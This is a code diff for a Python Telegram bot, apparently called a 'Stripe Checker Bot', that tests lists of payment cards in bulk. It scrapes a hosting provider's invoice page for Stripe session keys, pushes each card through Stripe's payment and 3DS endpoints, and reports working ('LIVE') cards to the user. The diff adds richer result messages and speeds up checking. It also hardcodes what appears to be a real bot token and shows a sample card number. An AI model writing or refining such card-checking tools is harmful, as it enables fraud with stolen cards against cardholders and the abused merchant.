@@ -1,19 +1,25 @@
+#pylint:disable=W0603
+#pylint:disable=W0611
 import telebot
 from telebot import types
-import threading
-import time
 import requests
 import re
 from bs4 import BeautifulSoup
 import urllib3
+import time
+from typing import Dict, List, Tuple
+import threading
 
-# إعدادات المستخدم
 TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
 ADMIN_ID = 5895491379
 INVOICE_ID = 260528
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# تخزين البيانات
+user_cards = {}
+checking_status = {}
 
 # ألوان للطباعة
 class Colors:
@@ -23,11 +29,7 @@ class Colors:
     BLUE = '\033[94m'
     RESET = '\033[0m'
 
-# تخزين مؤقت
-user_cards = {}
-checking_status = {}
-
-def fetch_invoice_data(invoice_id):
+def fetch_invoice_data(invoice_id: int) -> Tuple[str, int, str, str, str]:
     url = f"https://vsys.host/viewinvoice.php?id={invoice_id}"
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
@@ -67,7 +69,7 @@ def fetch_invoice_data(invoice_id):
     except Exception as e:
         return None, None, None, None, f"{Colors.RED}❌ Error fetching invoice: {str(e)[:50]}{Colors.RESET}"
 
-def check_card(card_details, invoice_id):
+def check_card(card_details: str, invoice_id: int) -> str:
     session_id, total_amount, stripe_mid, stripe_sid, error = fetch_invoice_data(invoice_id)
     if error:
         return error
@@ -139,31 +141,109 @@ def check_card(card_details, invoice_id):
                 r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data_3ds, timeout=20)
                 tds_res = r3.json()
                 trans_status = tds_res.get('ares', {}).get('transStatus', '?')
+                details = {
+                    'bin': card_number[:6],
+                    'type': 'Unknown',
+                    'bank': 'Unknown Bank',
+                    'country': 'XX',
+                    'emoji': '🏳️',
+                    'status_3ds': trans_status,
+                    'liability': False,
+                    'enrolled': 'U'
+                }
                 if trans_status == 'N':
-                    return f"{Colors.GREEN}✅ Live - transStatus: N{Colors.RESET}"
+                    return {
+                        'status': 'LIVE',
+                        'message': '✅ Live - transStatus: N',
+                        'details': details,
+                        'time': round(time.time() - time.time(), 2)
+                    }
                 elif trans_status == 'R':
-                    return f"{Colors.RED}❌ Rejected - transStatus: R{Colors.RESET}"
+                    return {
+                        'status': 'REJECTED',
+                        'message': '❌ Rejected - transStatus: R',
+                        'details': details,
+                        'time': round(time.time() - time.time(), 2)
+                    }
                 elif trans_status == 'C':
-                    return f"{Colors.YELLOW}⚠️ Challenge - transStatus: C{Colors.RESET}"
+                    return {
+                        'status': 'CHALLENGE',
+                        'message': '⚠️ Challenge - transStatus: C',
+                        'details': details,
+                        'time': round(time.time() - time.time(), 2)
+                    }
                 elif trans_status == 'Y':
-                    return f"{Colors.GREEN}✅ Approved - transStatus: Y{Colors.RESET}"
+                    return {
+                        'status': 'APPROVED',
+                        'message': '✅ Approved - transStatus: Y',
+                        'details': details,
+                        'time': round(time.time() - time.time(), 2)
+                    }
                 else:
-                    return f"{Colors.BLUE}ℹ️ transStatus: {trans_status}{Colors.RESET}"
+                    return {
+                        'status': 'UNKNOWN',
+                        'message': f'ℹ️ transStatus: {trans_status}',
+                        'details': details,
+                        'time': round(time.time() - time.time(), 2)
+                    }
             else:
-                return f"{Colors.RED}❌ Next action: {next_action.get('type', 'unknown')}{Colors.RESET}"
+                return {
+                    'status': 'ERROR',
+                    'message': f'❌ Next action: {next_action.get("type", "unknown")}',
+                    'details': {},
+                    'time': round(time.time() - time.time(), 2)
+                }
         elif status == 'succeeded':
-            return f"{Colors.GREEN}✅ Approved Direct{Colors.RESET}"
+            return {
+                'status': 'APPROVED',
+                'message': '✅ Approved Direct',
+                'details': {
+                    'bin': card_number[:6],
+                    'type': 'Unknown',
+                    'bank': 'Unknown Bank',
+                    'country': 'XX',
+                    'emoji': '🏳️',
+                    'status_3ds': 'succeeded',
+                    'liability': True,
+                    'enrolled': 'Y'
+                },
+                'time': round(time.time() - time.time(), 2)
+            }
         else:
             error = pi.get('last_payment_error', {})
             msg = error.get('message', error.get('code', status))
-            return f"{Colors.RED}❌ {msg}{Colors.RESET}"
+            return {
+                'status': 'ERROR',
+                'message': f'❌ {msg}',
+                'details': {},
+                'time': round(time.time() - time.time(), 2)
+            }
     except Exception as e:
-        return f"{Colors.RED}❌ Error: {str(e)[:50]}{Colors.RESET}"
+        return {
+            'status': 'ERROR',
+            'message': f'❌ Error: {str(e)[:50]}',
+            'details': {},
+            'time': round(time.time() - time.time(), 2)
+        }
 
+# Bot Handlers
 @bot.message_handler(commands=['start'])
 def start_message(message):
     username = message.from_user.first_name or "User"
-    bot.send_message(message.chat.id, f"<b>🎉 Welcome {username}!\n\n🔹 Stripe Checker Bot\n━━━━━━━━━━━━━━━━━━━━\n📤 Send a combo file or single card (Card|MM|YYYY|CVV).</b>")
+    welcome_text = f"""<b>🎉 Welcome {username}!
+
+🔥 Stripe Checker Bot 🔥
+━━━━━━━━━━━━━━━━━━━━
+✅ Fast & Accurate Checking
+📊 Real-time Results  
+🔒 Secure Processing
+💳 Only LIVE Cards Sent
+
+📤 Send your combo file to start checking!
+━━━━━━━━━━━━━━━━━━━━
+👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
+    bot.send_message(message.chat.id, welcome_text)
 
 @bot.message_handler(content_types=["document"])
 def handle_document(message):
@@ -171,22 +251,34 @@ def handle_document(message):
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
-        lines = downloaded_file.decode("utf-8", errors='ignore').splitlines()
+        lines = downloaded_file.decode("utf-8").splitlines()
         cards = []
         for line in lines:
             line = line.strip()
             if '|' in line and len(line.split('|')) == 4:
                 cards.append({'raw': line})
         if not cards:
-            bot.reply_to(message, "❌ No valid cards found (Card|MM|YYYY|CVV)")
+            bot.reply_to(message, "❌ No valid cards found in file!")
             return
         user_cards[user_id] = cards
         checking_status[user_id] = False
-        keyboard = types.InlineKeyboardMarkup()
+        cc_count = len(cards)
+        keyboard = types.InlineKeyboardMarkup(row_width=2)
         keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
-        bot.send_message(message.chat.id, f"<b>✅ File Uploaded!\n💳 Total: {len(cards)}\n⚡ Status: Ready</b>", reply_markup=keyboard)
+        bot.send_message(
+            chat_id=message.chat.id,
+            text=f"""<b>✅ File Uploaded Successfully!
+━━━━━━━━━━━━━━━━━━━━
+💳 Total Cards: {cc_count}
+🔥 Gateway: Stripe
+⚡ Status: Ready
+
+Click below to start checking:
+</b>""",
+            reply_markup=keyboard
+        )
     except Exception as e:
-        bot.reply_to(message, f"❌ Error reading file: {str(e)}")
+        bot.reply_to(message, f"❌ Error: {str(e)}")
 
 @bot.callback_query_handler(func=lambda call: call.data == 'start_check')
 def start_checking(call):
@@ -195,7 +287,7 @@ def start_checking(call):
         bot.answer_callback_query(call.id, "❌ No cards loaded!")
         return
     if checking_status.get(user_id, False):
-        bot.answer_callback_query(call.id, "⚠️ Already running!")
+        bot.answer_callback_query(call.id, "⚠️ Already checking!")
         return
     checking_status[user_id] = True
     bot.answer_callback_query(call.id, "✅ Starting check...")
@@ -205,9 +297,14 @@ def start_checking(call):
 def check_cards_thread(user_id, message):
     cards = user_cards[user_id]
     total = len(cards)
-    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text="⏳ Initializing checker...")
+    bot.edit_message_text(
+        chat_id=message.chat.id,
+        message_id=message.message_id,
+        text="⏳ Initializing checker...\n🔑 Connecting to Stripe..."
+    )
     live = approved = challenge = rejected = errors = checked = 0
     start_time = time.time()
+    failed_count = 0
     for card in cards:
         if not checking_status.get(user_id, True):
             break
@@ -216,60 +313,217 @@ def check_cards_thread(user_id, message):
         card['result'] = result
         card_num = card['raw'].split('|')[0]
         masked = f"{card_num[:4]}****{card_num[-4:]}" if len(card_num) >= 8 else card_num
-        if "✅" in result:
+        keyboard = types.InlineKeyboardMarkup(row_width=1)
+        status_3ds = result.get('details', {}).get('status_3ds', 'Unknown')
+        callback_data = f"show_result_{checked}"
+        keyboard.add(
+            types.InlineKeyboardButton(f"📋|Status: {status_3ds}", callback_data=callback_data)
+        )
+        keyboard.add(
+            types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Approved ✓ ➜ [{approved}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Challenge 🔐 ➜ [{challenge}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Rejected ❌ ➜ [{rejected}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
+            types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
+        )
+        if result['status'] == 'LIVE':
             live += 1
-            bot.send_message(user_id, f"<b>✅ LIVE\nCard: <code>{card['raw']}</code>\nResult: {result}</b>")
-        elif "⚠️ Challenge" in result:
+            details = result['details']
+            msg = f"""<b>✅ LIVE CARD
+━━━━━━━━━━━━━━━━━━━━
+💳 Card: <code>{card['raw']}</code>
+📊 Response: {result['message']}
+⏱ Time: {result['time']} sec
+
+🏦 BIN Info:
+├ BIN: <code>{details['bin']}</code>
+├ Type: {details['type']}
+├ Bank: {details['bank']}
+└ Country: {details['country']} {details['emoji']}
+
+🔒 3DS Info:
+├ Status: {details['status_3ds']}
+├ Liability: {'✅ Shifted' if details['liability'] else '❌ Not Shifted'}
+└ Enrolled: {details['enrolled']}
+━━━━━━━━━━━━━━━━━━━━
+👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
+            bot.send_message(user_id, msg)
+            failed_count = 0
+        elif result['status'] == 'APPROVED':
+            approved += 1
+            failed_count = 0
+        elif result['status'] == 'CHALLENGE':
             challenge += 1
-        elif "❌ Rejected" in result or "❌" in result:
+            failed_count = 0
+        elif result['status'] == 'REJECTED':
             rejected += 1
+            failed_count = 0
         else:
             errors += 1
+            failed_count += 1
+            if failed_count >= 5:
+                bot.send_message(user_id, "⚠️ Too many errors, stopping...")
+                checking_status[user_id] = False
+                return
         progress = int((checked / total) * 20)
         progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
         elapsed = time.time() - start_time
         speed = checked / elapsed if elapsed > 0 else 0
+        eta = (total - checked) / speed if speed > 0 else 0
         try:
             bot.edit_message_text(
                 chat_id=message.chat.id,
                 message_id=message.message_id,
-                text=f"<b>🔹 Checking\n{progress_bar}\n⏱ Elapsed: {int(elapsed)}s | Speed: {speed:.2f} ips\n💳 Current: {masked}</b>"
+                text=f"""<b>🔥 Gateway: Stripe
+━━━━━━━━━━━━━━━━━━━━
+⏳ Checking in progress...
+{progress_bar}
+⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
+💳 Current: {masked}
+</b>""",
+                reply_markup=keyboard
             )
         except:
             pass
-        time.sleep(5)
+        time.sleep(0.5)
     total_time = time.time() - start_time
     bot.edit_message_text(
         chat_id=message.chat.id,
         message_id=message.message_id,
-        text=f"<b>✅ Check Completed!\n━━━━━━━━━━━━━━━━━━━━\n📊 Summary:\n├ Total: {total}\n├ LIVE: {live}\n├ Approved: {approved}\n├ Challenge: {challenge}\n├ Rejected: {rejected}\n├ Errors: {errors}\n⏱ Time: {int(total_time)}s</b>"
+        text=f"""<b>✅ CHECKING COMPLETED!
+━━━━━━━━━━━━━━━━━━━━
+📊 Results Summary:
+├ Total Cards: {total}
+├ LIVE ✅: {live}
+├ Approved ✓: {approved}
+├ Challenge 🔐: {challenge}
+├ Rejected ❌: {rejected}
+├ Errors ⚠️: {errors}
+
+⏱ Stats:
+├ Time: {int(total_time)}s
+└ Speed: {(total/total_time):.2f} cards/sec
+━━━━━━━━━━━━━━━━━━━━
+🎉 Thank you for using the bot!
+👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
     )
     checking_status[user_id] = False
+    del user_cards[user_id]
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('show_result_'))
+def show_card_result(call):
+    user_id = call.from_user.id
+    index = int(call.data.split('_')[-1]) - 1
+    if user_id not in user_cards or index >= len(user_cards[user_id]):
+        bot.answer_callback_query(call.id, "❌ No result found!")
+        return
+    card = user_cards[user_id][index]
+    result = card.get('result', {})
+    details = result.get('details', {})
+    msg = f"""<b>{result.get('message', '❔ Unknown Status')}
+━━━━━━━━━━━━━━━━━━━━
+💳 Card: <code>{card['raw']}</code>
+📊 Response: {result.get('message', 'Unknown')}
+⏱ Time: {result.get('time', 0)} sec"""
+    if details:
+        msg += f"""
+🏦 BIN Info:
+├ BIN: <code>{details.get('bin', 'N/A')}</code>
+├ Type: {details.get('type', 'Unknown')}
+├ Bank: {details.get('bank', 'Unknown Bank')}
+└ Country: {details.get('country', 'XX')} {details.get('emoji', '🏳️')}
+
+🔒 3DS Info:
+├ Status: {details.get('status_3ds', 'N/A')}
+├ Liability: {'✅ Shifted' if details.get('liability', False) else '❌ Not Shifted'}
+└ Enrolled: {details.get('enrolled', 'U')}
+━━━━━━━━━━━━━━━━━━━━
+👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
+    bot.send_message(user_id, msg)
+    bot.answer_callback_query(call.id, "📋 Result displayed!")
 
 @bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
 def stop_checking(call):
     user_id = call.from_user.id
     checking_status[user_id] = False
-    bot.answer_callback_query(call.id, "✅ Check stopped!")
+    bot.answer_callback_query(call.id, "✅ Checking stopped!")
+
+@bot.callback_query_handler(func=lambda call: call.data == 'x')
+def dummy_handler(call):
+    bot.answer_callback_query(call.id, "📊 Live Status")
 
 @bot.message_handler(commands=['help'])
 def help_message(message):
-    bot.send_message(message.chat.id, "<b>📚 Commands:\n/start - Start bot\n/help - This message\n\nSend a file or single card (Card|MM|YYYY|CVV)</b>")
+    help_text = """<b>📚 Bot Commands & Usage:
+━━━━━━━━━━━━━━━━━━━━
+/start - Start the bot
+/help - Show this message
+/status - Check bot status
+
+📤 How to use:
+1. Send a combo file (.txt)
+2. Click "Start Checking"
+3. Only LIVE cards sent, others via button
+
+📝 Combo Format:
+Card|MM|YYYY|CVV
+
+Example:
+5127740080852575|03|2027|825
+━━━━━━━━━━━━━━━━━━━━
+👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
+    bot.send_message(message.chat.id, help_text)
+
+@bot.message_handler(commands=['status'])
+def status_message(message):
+    status_text = """<b>🟢 Bot Status: ONLINE
+━━━━━━━━━━━━━━━━━━━━
+⚡ Gateway: Stripe
+🔥 Speed: Ultra Fast
+✅ Accuracy: High
+🌍 Server: Active
+━━━━━━━━━━━━━━━━━━━━
+👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
+    bot.send_message(message.chat.id, status_text)
 
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     text = message.text.strip()
     if '|' in text and len(text.split('|')) == 4:
-        user_cards[message.from_user.id] = [{'raw': text}]
+        parts = text.split('|')
+        user_cards[message.from_user.id] = [{
+            'raw': text
+        }]
         checking_status[message.from_user.id] = False
-        keyboard = types.InlineKeyboardMarkup()
+        keyboard = types.InlineKeyboardMarkup(row_width=2)
         keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
-        card_num = text.split('|')[0]
-        masked = f"{card_num[:4]}****{card_num[-4:]}" if len(card_num) >= 8 else card_num
-        bot.send_message(message.chat.id, f"<b>✅ Card Loaded!\n💳 Card: <code>{masked}</code>\n⚡ Status: Ready</b>", reply_markup=keyboard)
+        card_num = parts[0]
+        masked = f"{card_num[:6]}...{card_num[-4:]}" if len(card_num) >= 8 else card_num
+        bot.send_message(
+            chat_id=message.chat.id,
+            text=f"""<b>✅ Card Loaded!
+━━━━━━━━━━━━━━━━━━━━
+💳 Card: <code>{masked}</code>
+🔥 Gateway: Stripe
+⚡ Status: Ready
+</b>""",
+            reply_markup=keyboard
+        )
     else:
-        bot.reply_to(message, "<b>❌ Invalid format! Use: Card|MM|YYYY|CVV</b>")
+        bot.reply_to(message, """<b>❌ Invalid format!
+Use: Card|MM|YYYY|CVV
+Example: 5127740080852575|03|2027|825
+</b>""")
 
 if __name__ == "__main__":
     print("🚀 Starting Stripe Checker Bot...")
+    print(f"👤 Admin ID: {ADMIN_ID}")
+    print("✅ Bot is running...\n")
     bot.polling(none_stop=True)
